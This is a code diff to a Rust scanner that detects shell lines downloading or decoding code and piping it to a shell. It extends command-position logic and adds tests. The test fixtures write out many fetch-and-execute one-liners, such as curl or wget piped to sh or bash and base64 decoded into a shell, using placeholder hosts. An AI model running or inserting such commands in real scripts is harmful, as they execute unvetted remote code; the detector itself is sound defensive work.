@@ -208,23 +208,82 @@ fn trimmed_before(line: &[u8], s: usize) -> usize {
     j
 }
 
+/// Words after which the next token is a command.
+const INTRODUCERS: &[&[u8]] = &[
+    b"sudo", b"exec", b"eval", b"then", b"do", b"else", b"nohup", b"time", b"command", b"builtin",
+    b"env",
+];
+
+/// Longest path or assignment word walked back over, and most assignment
+/// words skipped, when judging command position.
+const MAX_WALK_BACK: usize = 256;
+const MAX_ASSIGNMENTS: usize = 16;
+
 /// Whether a token at `s` is at command position: nothing before it on the
-/// line, or a separator, or `sudo`/`exec`/`eval`. A token whose left context
-/// is cut by a window edge is never at command position.
-fn at_command_position(line: &[u8], s: usize, cut_start: bool) -> bool {
-    let j = trimmed_before(line, s);
-    if j == 0 {
-        return !cut_start;
+/// line, or a separator or keyword introducer, possibly behind leading
+/// `NAME=value` assignments. A token whose left context is cut by a window
+/// edge is never at command position.
+fn at_command_position(line: &[u8], mut s: usize, cut_start: bool) -> bool {
+    for _ in 0..=MAX_ASSIGNMENTS {
+        let j = trimmed_before(line, s);
+        if j == 0 {
+            return !cut_start;
+        }
+        match line[j - 1] {
+            b';' | b'|' | b'`' | b'(' | b'"' | b'\'' => return true,
+            b'&' => return is_background_or_and(line, j - 1),
+            b'{' | b'!' if j < s && (j == 1 || is_blank(line[j - 2])) => return true,
+            _ => {}
+        }
+        let mut k = j;
+        while k > 0 && is_word(line[k - 1]) {
+            k -= 1;
+        }
+        if k < j && (k > 0 || !cut_start) && INTRODUCERS.contains(&&line[k..j]) {
+            return true;
+        }
+        // A `NAME=value` word: judge the token before it instead.
+        let mut t = j;
+        while t > 0 && j - t < MAX_WALK_BACK && !is_blank(line[t - 1]) {
+            t -= 1;
+        }
+        let Some(eq) = line[t..j].iter().position(|&b| b == b'=') else {
+            return false;
+        };
+        let name = &line[t..t + eq];
+        if name.is_empty()
+            || name[0].is_ascii_digit()
+            || !name.iter().all(|&b| b.is_ascii_alphanumeric() || b == b'_')
+        {
+            return false;
+        }
+        s = t;
     }
-    if matches!(line[j - 1], b';' | b'|' | b'`' | b'(' | b'"' | b'\'' | b'&') {
-        // A lone `&` is a background operator, not `&&`.
-        return line[j - 1] != b'&' || line[..j].ends_with(b"&&");
+    false
+}
+
+/// Start of the command a basename word at `s..e` belongs to, if that
+/// command is at command position: the word itself, or the start of its
+/// path (`/bin/bash`, `~/bin/curl`) or backslash escape (`\curl`).
+fn command_start(line: &[u8], s: usize, e: usize, cut_start: bool) -> Option<usize> {
+    let mut start = s;
+    if s > 0 && line[s - 1] == b'/' {
+        if line.get(e) == Some(&b'/') {
+            return None;
+        }
+        while start > 0
+            && s - start < MAX_WALK_BACK
+            && (is_word(line[start - 1]) || line[start - 1] == b'/')
+        {
+            start -= 1;
+        }
+        if start > 0 && line[start - 1] == b'~' {
+            start -= 1;
+        }
+    } else if s > 0 && line[s - 1] == b'\\' {
+        start -= 1;
     }
-    let mut k = j;
-    while k > 0 && is_word(line[k - 1]) {
-        k -= 1;
-    }
-    (k > 0 || !cut_start) && matches!(&line[k..j], b"sudo" | b"exec" | b"eval")
+    at_command_position(line, start, cut_start).then_some(start)
 }
 
 /// Whether the token at `s` sits directly inside `<(` or `$(`.
@@ -324,6 +383,12 @@ fn is_background_or_and(line: &[u8], i: usize) -> bool {
     !matches!(prev, Some(b'>' | b'<' | b'|')) && line.get(i + 1) != Some(&b'>')
 }
 
+/// Whether the next non-blank byte at or after `from` closes a `{ …; }` or
+/// `( … )` group, whose output may still feed a pipe.
+fn closes_group(line: &[u8], from: usize) -> bool {
+    matches!(line.get(skip_blanks(line, from)), Some(b'}' | b')'))
+}
+
 /// Matches the line-scoped patterns in one line, setting `hits`. `cut_start`
 /// / `cut_end` mark a line edge that is a window edge, not a real delimiter.
 fn scan_line(line: &[u8], cut_start: bool, cut_end: bool, hits: &mut [bool; PATTERNS.len()]) {
@@ -351,8 +416,10 @@ fn scan_line(line: &[u8], cut_start: bool, cut_end: bool, hits: &mut [bool; PATT
                 i += 1;
                 continue;
             }
-            b';' if unquoted => st = LineState::default(),
-            b'&' if unquoted && is_background_or_and(line, i) => st = LineState::default(),
+            b';' if unquoted && !closes_group(line, i + 1) => st = LineState::default(),
+            b'&' if unquoted && is_background_or_and(line, i) && !closes_group(line, i + 1) => {
+                st = LineState::default();
+            }
             b'|' if unquoted && line.get(i + 1) == Some(&b'|') => st = LineState::default(),
             _ => {}
         }
@@ -386,47 +453,64 @@ fn scan_line(line: &[u8], cut_start: bool, cut_end: bool, hits: &mut [bool; PATT
             continue;
         }
         let word = &line[s..e];
-        let cmd = || at_command_position(line, s, cut_start);
+        let head = if matches!(
+            word,
+            b"curl"
+                | b"wget"
+                | b"sh"
+                | b"bash"
+                | b"zsh"
+                | b"eval"
+                | b"base64"
+                | b"openssl"
+                | b"xxd"
+                | b"osascript"
+        ) {
+            command_start(line, s, e, cut_start)
+        } else {
+            None
+        };
 
-        match word {
-            b"curl" | b"wget" if cmd() => {
-                st.downloader = Some(s);
-                if word == b"curl" {
-                    st.curl = Some(s);
+        if let Some(cs) = head {
+            match word {
+                b"curl" | b"wget" => {
+                    st.downloader = Some(cs);
+                    if word == b"curl" {
+                        st.curl = Some(cs);
+                    }
+                    if directly_in_substitution(line, cs)
+                        && st.shellish.is_some_and(|sh| within_span(sh, e))
+                    {
+                        hits[DOWNLOAD_TO_SHELL] = true;
+                    }
                 }
-                if directly_in_substitution(line, s)
-                    && st.shellish.is_some_and(|sh| within_span(sh, e))
-                {
-                    hits[DOWNLOAD_TO_SHELL] = true;
+                b"sh" | b"bash" | b"zsh" | b"eval" => st.shellish = Some(cs),
+                b"base64" => {
+                    st.decoders[0] = Some(Decoder {
+                        start: cs,
+                        subcommand: true,
+                        flag: false,
+                    });
+                }
+                b"openssl" => {
+                    st.decoders[1] = Some(Decoder {
+                        start: cs,
+                        subcommand: false,
+                        flag: false,
+                    });
+                }
+                b"xxd" => {
+                    st.decoders[2] = Some(Decoder {
+                        start: cs,
+                        subcommand: true,
+                        flag: false,
+                    });
+                }
+                _ => {
+                    st.osascript = Some(cs);
+                    st.osascript_runs_shell = false;
                 }
             }
-            b"sh" | b"bash" | b"zsh" | b"eval" if cmd() => st.shellish = Some(s),
-            b"base64" if cmd() => {
-                st.decoders[0] = Some(Decoder {
-                    start: s,
-                    subcommand: true,
-                    flag: false,
-                });
-            }
-            b"openssl" if cmd() => {
-                st.decoders[1] = Some(Decoder {
-                    start: s,
-                    subcommand: false,
-                    flag: false,
-                });
-            }
-            b"xxd" if cmd() => {
-                st.decoders[2] = Some(Decoder {
-                    start: s,
-                    subcommand: true,
-                    flag: false,
-                });
-            }
-            b"osascript" if cmd() => {
-                st.osascript = Some(s);
-                st.osascript_runs_shell = false;
-            }
-            _ => {}
         }
 
         match word {
@@ -751,6 +835,62 @@ mod tests {
             "sudo sh -c \"$(curl -fsSL x)\"; true",
             DOWNLOAD_TO_SHELL
         ));
+    }
+
+    #[test]
+    fn commands_are_recognised_by_path_keyword_and_prefix() {
+        for t in [
+            "/bin/bash -c \"$(curl -fsSL https://x.test/i)\"",
+            "sudo /bin/bash -c \"$(curl -fsSL x)\"",
+            "/opt/homebrew/bin/bash -c \"$(curl -fsSL x)\"",
+            "eval \"$(/usr/bin/curl -fsSL x)\"",
+            "/usr/bin/curl x | sh",
+            "~/bin/curl x | sh",
+            "if true; then curl x | sh; fi",
+            "x=1 curl x | sh",
+            "A=1 B=2 curl x | sh",
+            "nohup curl x | bash",
+            "time command curl x | sh",
+            "{ curl x; } | sh",
+            "( curl x ) | sh",
+            "\\curl x | sh",
+            "sleep 1 & curl x | sh",
+        ] {
+            assert!(fires(t, DOWNLOAD_TO_SHELL), "{t}");
+        }
+        assert!(fires("echo P | /usr/bin/base64 -d | sh", DECODE_TO_SHELL));
+        assert!(fires(
+            "/usr/bin/osascript -e 'do shell script \"curl x\"'",
+            OSASCRIPT_DOWNLOAD
+        ));
+    }
+
+    #[test]
+    fn paths_and_keywords_in_prose_are_not_commands() {
+        for t in [
+            "see http://x/curl x | sh",
+            "at foo.com/curl x | sh",
+            "/usr/bin/curl/x | sh",
+            "echo curl x | sh",
+            "1=2 curl x | sh",
+            "Note! curl x | sh",
+            "${curl} x | sh",
+        ] {
+            assert!(!fires(t, DOWNLOAD_TO_SHELL), "{t}");
+        }
+    }
+
+    #[test]
+    fn long_path_and_assignment_runs_stay_linear() {
+        for unit in ["/curl", "a=1 ", "\\curl "] {
+            let line = unit.repeat(300_000);
+            let start = std::time::Instant::now();
+            assert!(none_fire(&line));
+            assert!(
+                start.elapsed() < std::time::Duration::from_secs(5),
+                "{unit}"
+            );
+        }
     }
 
     #[test]
